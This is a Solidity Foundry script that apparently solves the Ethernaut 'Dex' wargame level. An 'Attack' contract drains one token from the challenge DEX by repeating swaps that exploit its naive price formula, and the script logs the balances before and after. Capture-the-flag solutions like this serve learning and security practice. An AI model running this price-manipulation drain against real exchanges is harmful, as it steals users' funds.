// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Dex, IERC20} from "../src/22_Dex.sol";
import {Script, console} from "forge-std/Script.sol";

contract DexSolve is Script {
    Dex dex = Dex(0x5B39C38ED10c5A57aF92e09bB34DeDf851Df9024);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address token1 = dex.token1();
        address token2 = dex.token2();
        // (amount * to ) / from -> swapAmount
        // if  amount == from  then smapAmount = to

        console.log("Before#");
        console.log("Dex Token1 Balance", IERC20(token1).balanceOf(address(dex)));
        console.log("Dex Token2 Balance", IERC20(token2).balanceOf(address(dex)));

        Attack attack = new Attack();
        IERC20(token1).transfer(address(attack), 10);
        IERC20(token2).transfer(address(attack), 10);
        attack.pwn();

        console.log("After#");
        console.log("Dex Token1 Balance", IERC20(token1).balanceOf(address(dex)));
        console.log("Dex Token2 Balance", IERC20(token2).balanceOf(address(dex)));

        vm.stopBroadcast();
    }
}

contract Attack {
    Dex dex = Dex(0x5B39C38ED10c5A57aF92e09bB34DeDf851Df9024);

    function pwn() external {
        dex.approve(address(dex), type(uint256).max);
        address token1 = dex.token1();
        address token2 = dex.token2();

        dex.swap(token1, token2, dex.balanceOf(token1, address(this)));
        dex.swap(token2, token1, dex.balanceOf(token2, address(this)));
        dex.swap(token1, token2, dex.balanceOf(token1, address(this)));
        dex.swap(token2, token1, dex.balanceOf(token2, address(this)));
        dex.swap(token1, token2, dex.balanceOf(token1, address(this)));

        dex.swap(token2, token1, dex.balanceOf(token2, address(dex)));
    }
}
